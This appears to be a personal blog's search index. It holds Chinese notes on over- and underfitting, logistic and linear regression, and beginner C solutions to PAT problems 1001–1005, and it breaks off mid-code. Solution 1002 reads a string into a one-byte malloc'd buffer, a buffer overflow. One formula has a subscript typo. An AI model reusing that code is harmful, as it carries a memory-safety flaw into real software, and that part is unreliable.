<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>OverFitting and UnderFitting</title>
    <url>/post/cd9f31fa.html</url>
    <content><![CDATA[<p>过拟合(overfitting)和欠拟合(underfitting)是导致模型泛化能力不高的两种常见原因，都是模型学习能力与数据复杂度之间失配的结果。</p>
<h3 id="过拟合-Overfitting"><a href="#过拟合-Overfitting" class="headerlink" title="过拟合(Overfitting)"></a>过拟合(Overfitting)</h3><p>常常在模型学习能力过强的情况中出现，此时的模型学习能力太强，以至于将训练集单个样本自身的特点都能捕捉到，并将其认为是“一般规律”，同样这种情况也会导致模型泛化能力下降。</p>
<h3 id="欠拟合-Underfitting"><a href="#欠拟合-Underfitting" class="headerlink" title="欠拟合(Underfitting)"></a>欠拟合(Underfitting)</h3><p>常常在模型学习能力较弱，而数据复杂度较高的情况出现，此时模型由于学习能力不足，无法学习到数据集中的“一般规律”，因而导致泛化能力弱。<br>泛化能力:对训练集以外样本的预测能力</p>
<h3 id="两者的区别"><a href="#两者的区别" class="headerlink" title="两者的区别"></a>两者的区别</h3><p>欠拟合在训练集和测试集上的性能都较差，而过拟合往往能较好地学习训练集数据的性质，而在测试集上的性能较差。在神经网络训练的过程中，欠拟合主要表现为输出结果的高偏差，而过拟合主要表现为输出结果的高方差。<br>图例:<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/ML/LogisticRegression/fit.jpg" alt=""></p>
<p><a href="https://www.debugger.wiki/article/html/1552636800516141" target="_blank" rel="noopener">产生的原因及其解决方案</a></p>
]]></content>
      <categories>
        <category>ML</category>
      </categories>
  </entry>
  <entry>
    <title>Logistic-Regression</title>
    <url>/post/3414eb33.html</url>
    <content><![CDATA[<p>逻辑回归算法是一种分类算法，不是回归算法<br>逻辑回归算法可用于寻找决策边界</p>
<script type="math/tex; mode=display">h_\theta(x) = g(\theta^Tx)</script><p>训练集：</p>
<script type="math/tex; mode=display">\{ (x^{(1)},y^{(1)}), (x^{(2)},y^{(2)}),\cdots,(x^{(m)},y^{(m)})\}</script><p>特征变量：</p>
<script type="math/tex; mode=display">x\in \begin{bmatrix} x^0 \\ x^1 \\ \vdots \\ x^n \end{bmatrix}, \quad x^0=1,y\in\{0,1\}</script><h3 id="假设函数"><a href="#假设函数" class="headerlink" title="假设函数"></a>假设函数</h3><script type="math/tex; mode=display">h_\theta(x) = \frac{1}{1+e{^{-\theta^Tx}}}=P\{y=1|x;\theta\}</script><h3 id="Sigmoid-function-Logistic-function"><a href="#Sigmoid-function-Logistic-function" class="headerlink" title="Sigmoid function(Logistic function)"></a>Sigmoid function(Logistic function)</h3><script type="math/tex; mode=display">g(z) = \frac{1}{1+e^{-z}}</script><p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/ML/LogisticRegression/gx.jpg" alt=""></p>
<h3 id="决策边界-Decision-boundary"><a href="#决策边界-Decision-boundary" class="headerlink" title="决策边界(Decision boundary)"></a>决策边界(Decision boundary)</h3><p>h(x)=0.5<br>决策边界不是训练集的属性，而是假设本身及其参数的属性。这是因为只要给定了参数向量θ，就确定了决策边界。而数据集是用来拟合参数θ</p>
<h3 id="代价函数"><a href="#代价函数" class="headerlink" title="代价函数"></a>代价函数</h3><script type="math/tex; mode=display">J(\theta) = \frac{1}{m}\sum_{i=1}^{m}Cost(h_\theta(x^{(i)}),y^{(i)})</script><script type="math/tex; mode=display">Cost(h_\theta(x),y) = \begin{cases} -log(h_\theta(x)),& \text{if y = 1}\\-log(1-h_\theta(x)),& \text{if y = 0} \end{cases}</script><p>将Cost函数写的更加紧凑：</p>
<script type="math/tex; mode=display">Cost(h_\theta(x),y) = -ylog(h_\theta(x))-(1-y)log(1-h_\theta(x))</script><script type="math/tex; mode=display">J(\theta) = \frac{1}{m}\sum_{i=1}^{m}Cost(h_\theta(x^{(i)}),y^{(i)})=-\frac{1}{m}[\sum_{i=1}^{m}y^{(i)}logh_\theta(x^{(i)})+(1-y^{(i)})log(1-h_\theta(x^{(i)}))]</script><h3 id="梯度下降"><a href="#梯度下降" class="headerlink" title="梯度下降"></a>梯度下降</h3><p>寻找 min<sub>θ</sub> J(θ)<br>Repeat{</p>
<script type="math/tex; mode=display">\theta {_j} := \theta {_j}-\alpha \sum_{i=1}^{m}(h{_\theta}(x{^{^{(i)}}})-y{^{(i)}}) \cdot x_j{^{(i)}} \quad (simultaneously \quad update \quad all \quad \theta_j)</script><p>}</p>
<h3 id="多分类-Multiclass-classification"><a href="#多分类-Multiclass-classification" class="headerlink" title="多分类(Multiclass classification)"></a>多分类(Multiclass classification)</h3><h4 id="One-vs-all"><a href="#One-vs-all" class="headerlink" title="One-vs-all"></a>One-vs-all</h4><p>为每一个类 i 训练一个逻辑回归分类器 h<sub>θ</sub><sup>(i)</sup>(x)来预测y=i的概率<br>对于一个新的输入x，先进行预测，然后选择概率最大的类 i,即max h<sub>θ</sub><sup>(i)</sup>(x) ，也就是预测结果<br>将多个类中的一个类标记为正向类(y=1),其余的类全部标记为负向类；<br>然后再选择另一个类标记为正向类(y=2),其余的类全部标记为负向类；<br>依此类推，可得到如下模型:</p>
<script type="math/tex; mode=display">h_\theta^{(i)}(x) = P\{y=i|x;\theta\} \quad(i=1,2,\cdots)</script><p>图例：<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/ML/LogisticRegression/one_vs_all1.jpg" alt=""><br>本例中需要构建三个分类器，每个分类器针对一种情况进行训练</p>
]]></content>
      <categories>
        <category>ML</category>
      </categories>
  </entry>
  <entry>
    <title>Linear-Regression</title>
    <url>/post/8ec027d1.html</url>
    <content><![CDATA[<h3 id="假设函数-Hypothesis"><a href="#假设函数-Hypothesis" class="headerlink" title="假设函数(Hypothesis)"></a>假设函数(Hypothesis)</h3><script type="math/tex; mode=display">h(x) = \theta {_0} + \theta {_1} x</script><p>假设函数用于拟合真实的线性关系</p>
<h3 id="代价函数-Cost-Function"><a href="#代价函数-Cost-Function" class="headerlink" title="代价函数(Cost Function)"></a>代价函数(Cost Function)</h3><script type="math/tex; mode=display">J(\theta {_0},\theta{_1}) = \frac{1}{2m} \sum_{i=1}^{m}(h{_\theta}(x{^{^{(i)}}})-y{^{(i)}}){^2}</script><p>m为训练集的样本容量，代价函数用于描述预测值（代价函数输出）与真实值（训练样本）之间的误差，代价函数也称平方误差代价函数，代价函数常用于线性回归问题</p>
<h3 id="最小化代价函数"><a href="#最小化代价函数" class="headerlink" title="最小化代价函数"></a>最小化代价函数</h3><script type="math/tex; mode=display">minimizeJ(\theta {_0},\theta{_1})</script><p>不断调整θ<sub>0</sub>和θ<sub>1</sub>，从而逼近最小的代价函数，即会得到较为贴近真实线性关系的假设函数</p>
<h3 id="梯度下降法-Gradient-Descent"><a href="#梯度下降法-Gradient-Descent" class="headerlink" title="梯度下降法(Gradient Descent)"></a>梯度下降法(Gradient Descent)</h3><p>在线性回归中用于最小化代价函数<br>repeat until convergence{</p>
<script type="math/tex; mode=display">\theta {_j} := \theta {_j}-\alpha \frac{\partial}{\partial{\theta {_j}}}J(\theta {_0},\theta{_1})\quad (simultaneously \quad update \quad j=0 \quad and \quad j=1)</script><p>}<br>在该算法中，必须同步更新θ<sub>0</sub>和θ<sub>1</sub></p>
<h4 id="学习率α"><a href="#学习率α" class="headerlink" title="学习率α"></a>学习率α</h4><p>α为学习率，它控制着以多大的幅度来更新参数θ<sub>j</sub>，α的选择十分重要，如果α太小，梯度下降会变得很慢；如果α太大，梯度下降会越过最小值，可能导致无法收敛，甚至发散；如果α已经处于代价函数局部最低点，此时偏导数项为0，θ<sub>j</sub>就不会改变了，即停止在局部最优解<br>即使α是固定的，梯度下降也可以收敛到局部最小值，这是因为随着梯度下降，偏导数项逐渐减小，而α固定，整体也是减小的。偏导数项最后趋近于0，由于α是有界值，无穷小乘有界值依然是无穷小，所以后一项也趋近于0，即收敛到了局部最小值</p>
<h4 id="偏导数项"><a href="#偏导数项" class="headerlink" title="偏导数项"></a>偏导数项</h4><script type="math/tex; mode=display">\frac{\partial}{\partial{\theta {_j}}}J(\theta {_0},\theta{_1})=\frac{\partial}{\partial{\theta {_j}}}\frac{1}{2m} \sum_{i=1}^{m}(h{_\theta}(x{^{^{(i)}}})-y{^{(i)}}){^2}</script><script type="math/tex; mode=display">\frac{\partial}{\partial{\theta {_0}}}J(\theta {_0},\theta{_1})=\frac{1}{m} \sum_{i=1}^{m}(h{_\theta}(x{^{^{(i)}}})-y{^{(i)}})</script><script type="math/tex; mode=display">\frac{\partial}{\partial{\theta {_1}}}J(\theta {_1},\theta{_1})=\frac{1}{m} \sum_{i=1}^{m}(h{_\theta}(x{^{^{(i)}}})-y{^{(i)}}) \cdot x{^{(i)}}</script><h4 id="Gradient-descent-algorithm"><a href="#Gradient-descent-algorithm" class="headerlink" title="Gradient descent algorithm"></a>Gradient descent algorithm</h4><p>repeat until convergence{</p>
<script type="math/tex; mode=display">\theta {_0} := \theta {_0}-\alpha\frac{1}{m} \sum_{i=1}^{m}(h{_\theta}(x{^{^{(i)}}})-y{^{(i)}})</script><script type="math/tex; mode=display">\theta {_1} := \theta {_1}-\alpha\frac{1}{m} \sum_{i=1}^{m}(h{_\theta}(x{^{^{(i)}}})-y{^{(i)}}) \cdot x{^{(i)}}</script><p>}</p>
<p>线性回归的代价函数没有局部最优解，只有全局最优解</p>
<h3 id="多元线性回归-Multivariate-linear-regression"><a href="#多元线性回归-Multivariate-linear-regression" class="headerlink" title="多元线性回归(Multivariate linear regression)"></a>多元线性回归(Multivariate linear regression)</h3><h4 id="假设函数"><a href="#假设函数" class="headerlink" title="假设函数"></a>假设函数</h4><script type="math/tex; mode=display">h(x) = \theta {_0}x{_0} + \theta {_1}x{_1} + \theta {_2}x{_2} + \cdots+ \theta {_n}x{_n}</script><p>定义x<sub>0</sub>=1</p>
<script type="math/tex; mode=display">\theta = \begin{bmatrix} \theta_0 \\ \theta_1 \\\theta_2 \\ \vdots \\ \theta_n \end{bmatrix} , \quad x = \begin{bmatrix} x_0 \\ x_1 \\ x_2 \\ \vdots \\ x_n \end{bmatrix}</script><script type="math/tex; mode=display">h_\theta(x) = \theta^Tx</script><h4 id="代价函数"><a href="#代价函数" class="headerlink" title="代价函数"></a>代价函数</h4><script type="math/tex; mode=display">J(\theta {_0},\theta{_1},\cdots,\theta_n) = \frac{1}{2m} \sum_{i=1}^{m}(h{_\theta}(x{^{^{(i)}}})-y{^{(i)}}){^2}</script><h4 id="梯度下降"><a href="#梯度下降" class="headerlink" title="梯度下降"></a>梯度下降</h4><p>Repeat{</p>
<script type="math/tex; mode=display">\theta_j:=\theta_j-\alpha\frac{\partial}{\partial{\theta {_j}}}J(\theta {_0},\theta{_1},\cdots,\theta_n) \quad
(simultaneously \quad update \quad for \quad every \quad j=0,1,\cdots,n)</script><p>}</p>
<h4 id="Gradient-descent-algorithm-1"><a href="#Gradient-descent-algorithm-1" class="headerlink" title="Gradient descent algorithm"></a>Gradient descent algorithm</h4><script type="math/tex; mode=display">\theta {_j} := \theta {_j}-\alpha\frac{1}{m} \sum_{i=1}^{m}(h{_\theta}(x{^{^{(i)}}})-y{^{(i)}}) \cdot x_j{^{(i)}} \quad(simultaneously \quad update \quad \theta_j \quad for \quad j=0,1,\cdots,n)</script><h4 id="多元梯度下降法-Gradient-descent-for-multiple-variables"><a href="#多元梯度下降法-Gradient-descent-for-multiple-variables" class="headerlink" title="多元梯度下降法(Gradient descent for multiple variables)"></a>多元梯度下降法(Gradient descent for multiple variables)</h4><h5 id="特征缩放-Feature-Scaling"><a href="#特征缩放-Feature-Scaling" class="headerlink" title="特征缩放(Feature Scaling)"></a>特征缩放(Feature Scaling)</h5><p>让特征值的范围变得相近，使得梯度下降能够更快的收敛。通常将特征的取值约束到-1 ≤ x<sub>i</sub> ≤ 1的范围内或附近</p>
<h6 id="均值归一化-Mean-normalization"><a href="#均值归一化-Mean-normalization" class="headerlink" title="均值归一化(Mean normalization)"></a>均值归一化(Mean normalization)</h6><p>用x<sub>i</sub>-μ<sub>i</sub>替换x<sub>i</sub>使得特征的均值近似为0(不适用于x<sub>0</sub>=1)。通常使用如下方法：</p>
<script type="math/tex; mode=display">x_i = \frac{x_i-\mu_i}{S_i}</script><p>其中μ<sub>i</sub>为均值，S<sub>i</sub>为标准差</p>
<h3 id="正规方程-Normal-equation"><a href="#正规方程-Normal-equation" class="headerlink" title="正规方程(Normal equation)"></a>正规方程(Normal equation)</h3><p>正规方程可求出最优的θ值</p>
<script type="math/tex; mode=display">\theta = (X^TX)^{-1}X^Ty</script><p>设有m个训练样本(x<sup>(1)</sup>,y<sup>(1)</sup>),⋯,(x<sup>(m)</sup>,y<sup>(m)</sup>)和n个特征变量</p>
<script type="math/tex; mode=display">x^{(i)} = \begin{bmatrix} x{_0}^{(i)} \\ x{_1}^{(i)} \\ \vdots \\ x{_n}^{(i)} \end{bmatrix}</script><script type="math/tex; mode=display">X = \begin{bmatrix} (x^{(1)})^T \\ (x^{(2)})^T \\ \vdots \\ (x^{(m)})^T \end{bmatrix}</script><script type="math/tex; mode=display">y = \begin{bmatrix} y^{(1)} \\ y^{(2)} \\ \vdots \\ y^{(m)} \end{bmatrix}</script><h4 id="矩阵不可逆"><a href="#矩阵不可逆" class="headerlink" title="矩阵不可逆"></a>矩阵不可逆</h4><ul>
<li>冗余特征<br>选取的某些特征线性相关</li>
<li>特征过多(m ≤ n)<br>此时可选择去掉一些特征，或者使用正则化方法<h3 id="梯度下降法-VS-正规方程"><a href="#梯度下降法-VS-正规方程" class="headerlink" title="梯度下降法 VS 正规方程"></a>梯度下降法 VS 正规方程</h3>m个训练样本，n个特征变量<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/ML/LinearRegression/GD_NE.jpg" alt=""></li>
</ul>
]]></content>
      <categories>
        <category>ML</category>
      </categories>
  </entry>
  <entry>
    <title>PAT</title>
    <url>/post/16991c0b.html</url>
    <content><![CDATA[<p>之前没有学过C语言，只学过C++，但是目标院校复试只限C语言，C语言和C++在语法上还是有一些差异的，所以打算刷些题熟悉一下语法</p>
<h3 id="1001-害死人不偿命的-3n-1-猜想"><a href="#1001-害死人不偿命的-3n-1-猜想" class="headerlink" title="1001 害死人不偿命的(3n+1)猜想"></a>1001 害死人不偿命的(3n+1)猜想</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n);</span><br><span class="line">    <span class="keyword">int</span> <span class="built_in">step</span>=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(n != <span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(n%<span class="number">2</span>==<span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                n = n/<span class="number">2</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                n = (<span class="number">3</span>*n+<span class="number">1</span>)/<span class="number">2</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">step</span>++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d"</span>,<span class="built_in">step</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="1002-写出这个数"><a href="#1002-写出这个数" class="headerlink" title="1002 写出这个数"></a>1002 写出这个数</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *pin[]= &#123;<span class="string">"ling"</span>,<span class="string">"yi"</span>,<span class="string">"er"</span>,<span class="string">"san"</span>,<span class="string">"si"</span>,<span class="string">"wu"</span>,<span class="string">"liu"</span>,<span class="string">"qi"</span>,<span class="string">"ba"</span>,<span class="string">"jiu"</span>&#125;;</span><br><span class="line">    <span class="keyword">char</span> *n = (<span class="keyword">char</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">char</span>));</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%s"</span>,n);</span><br><span class="line">    <span class="keyword">int</span> sum=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="built_in">strlen</span>(n);i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> tmp = n[i]-<span class="string">'0'</span>;</span><br><span class="line">        sum += tmp;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">char</span> res[<span class="number">10</span>];</span><br><span class="line">    <span class="built_in">sprintf</span>(res,<span class="string">"%d"</span>,sum);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="built_in">strlen</span>(res)<span class="number">-1</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> tmp = res[i] - <span class="string">'0'</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%s "</span>,pin[tmp]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> tmp = res[<span class="built_in">strlen</span>(res)<span class="number">-1</span>] - <span class="string">'0'</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s"</span>,pin[tmp]);</span><br><span class="line">    <span class="built_in">free</span>(n);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="1003-我要通过！"><a href="#1003-我要通过！" class="headerlink" title="1003 我要通过！"></a>1003 我要通过！</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Judge</span><span class="params">(<span class="keyword">char</span> *str,<span class="keyword">int</span> len)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n);</span><br><span class="line">    <span class="keyword">char</span> input[n][<span class="number">100</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%s"</span>,input[i]);</span><br><span class="line">        <span class="keyword">int</span> len =<span class="built_in">strlen</span>(input[i]);</span><br><span class="line">        <span class="keyword">int</span> res = Judge(input[i],len);</span><br><span class="line">        <span class="keyword">if</span>(res==<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"YES\n"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"NO\n"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Judge</span><span class="params">(<span class="keyword">char</span> *str,<span class="keyword">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> countP=len+<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">int</span> countT=len+<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">int</span> indexP;</span><br><span class="line">    <span class="keyword">int</span> indexT;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;len; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(str[i] != <span class="string">'P'</span> &amp;&amp; str[i] != <span class="string">'T'</span> &amp;&amp; str[i] != <span class="string">'A'</span>)<span class="comment">//检测含有不是P、A、T的字符</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(str[i]==<span class="string">'P'</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            countP++;</span><br><span class="line">            indexP = i;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(str[i]==<span class="string">'T'</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            countT++;</span><br><span class="line">            indexT=i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    countP = countP - len <span class="number">-2</span>;</span><br><span class="line">    countT = countT - len <span class="number">-2</span>;</span><br><span class="line">    <span class="keyword">if</span>(indexP == len+<span class="number">2</span> || indexT==len+<span class="number">2</span> || countP!=<span class="number">1</span> || countT!=<span class="number">1</span> || indexT-indexP&lt;=<span class="number">1</span>)<span class="comment">//检测除了一个P和一个T，剩下的都是A;'PT';T在P前面</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(indexP==<span class="number">0</span> &amp;&amp; indexT == len<span class="number">-1</span>)<span class="comment">//类似PAAAAT</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(len-indexT<span class="number">-1</span>-indexP==(indexT-indexP<span class="number">-2</span>)*indexP)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="1004-成绩排名"><a href="#1004-成绩排名" class="headerlink" title="1004 成绩排名"></a>1004 成绩排名</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> *<span class="title">sort</span><span class="params">(<span class="keyword">int</span> arr[],<span class="keyword">int</span> len)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n);</span><br><span class="line">    <span class="keyword">char</span> name[n][<span class="number">11</span>];</span><br><span class="line">    <span class="keyword">char</span> stuNum[n][<span class="number">11</span>];</span><br><span class="line">    <span class="keyword">int</span> grade[n];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%s %s %d"</span>,name[i],stuNum[i],&amp;grade[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> tmp[n];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">0</span>;k&lt;n;k++)</span><br><span class="line">    &#123;</span><br><span class="line">        tmp[k] = grade[k];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> *p=sort(tmp,n);</span><br><span class="line">    <span class="keyword">int</span> <span class="built_in">max</span>,<span class="built_in">min</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> k =<span class="number">0</span>;k&lt;n;k++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(p[<span class="number">0</span>]==grade[k])</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">min</span> = k;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(p[n<span class="number">-1</span>]==grade[k])</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">max</span> = k;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s %s\n%s %s"</span>,name[<span class="built_in">max</span>],stuNum[<span class="built_in">max</span>],name[<span class="built_in">min</span>],stuNum[<span class="built_in">min</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> *<span class="title">sort</span><span class="params">(<span class="keyword">int</span> arr[],<span class="keyword">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;len; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>; j&lt;len-i<span class="number">-1</span>; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(arr[j]&gt;arr[j+<span class="number">1</span>])</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">int</span> tmp = arr[j+<span class="number">1</span>];</span><br><span class="line">                arr[j+<span class="number">1</span>] = arr[j];</span><br><span class="line">                arr[j] = tmp;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> arr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="1005-继续-3n-1-猜想"><a href="#1005-继续-3n-1-猜想" class="headerlink" title="1005 继续(3n+1)猜想"></a>1005 继续(3n+1)猜想</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> Len;</span><br><span class="line"><span class="function"><span class="keyword">int</span> *<span class="title">getList</span><span class="params">(<span class="keyword">int</span> n,<span class="keyword">int</span> len)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> K;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;K);</span><br><span class="line">    <span class="keyword">int</span> n[K];</span><br><span class="line">    <span class="keyword">int</span> tmp[K];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;K; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n[i]);</span><br><span class="line">        tmp[i] = n[i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>; j&lt;K; j++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(tmp[j]!=<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">int</span> *p = getList(n[j],Len);</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;Len; i++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">0</span>; k&lt;K; k++)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">if</span>(p[i]==tmp[k])</span><br><span class="line">                    &#123;</span><br><span class="line">                        tmp[k] = <span class="number">0</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;K; i++)<span 